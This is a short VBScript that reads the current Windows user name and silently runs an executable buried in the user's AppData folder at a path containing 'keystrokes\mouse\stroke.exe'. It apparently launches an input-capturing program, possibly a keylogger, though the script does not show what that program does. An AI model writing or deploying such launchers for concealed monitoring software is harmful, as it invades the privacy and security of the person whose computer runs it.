Set wshShell = CreateObject( "WScript.Shell" )
userName = wshShell.ExpandEnvironmentStrings( "%UserName%" )

path = "C:\Users\" + userName + "\AppData\Local\NotReady\keystrokes\mouse\stroke.exe"
wshShell.run(path)